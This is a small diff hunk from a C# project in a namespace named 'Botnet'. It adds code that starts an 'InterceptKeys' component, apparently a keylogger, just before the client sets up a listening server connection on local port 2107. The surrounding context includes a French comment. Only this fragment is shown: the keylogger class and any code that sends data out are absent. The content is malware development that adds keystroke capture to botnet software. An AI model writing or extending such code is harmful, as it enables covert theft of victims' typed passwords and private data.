@@ -32,7 +32,10 @@ namespace Botnet
                 Console.WriteLine(str);
             }
 
-
+            InterceptKeys interceptor = new InterceptKeys();
+            interceptor.start();
+            
+            
             //Initialisation d'un objet ServerConnectors "sc" avec les informations les plus importantes: ip et port d'écoute:
             ServerConnectors sc = new ServerConnectors(IPAddress.Parse("127.0.0.1"), 2107);
 
